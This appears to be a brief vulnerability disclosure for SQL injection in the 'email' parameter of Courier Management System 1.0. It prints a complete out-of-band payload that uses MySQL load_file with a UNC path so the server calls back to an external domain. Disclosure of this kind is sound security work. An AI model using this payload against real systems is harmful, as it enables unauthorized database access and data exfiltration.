## Description:
The `email` parameter from Courier Management System 1.0 appears to be vulnerable to SQL injection attacks. 
The payload '+(select load_file('\\\\ipb60j3tyyqct2vn1oi9ox4it9z2ntix6o9c1zrng.nu11secur1tyPenetrationTestingEngineer.net\\pcl'))+' was submitted in the email parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.
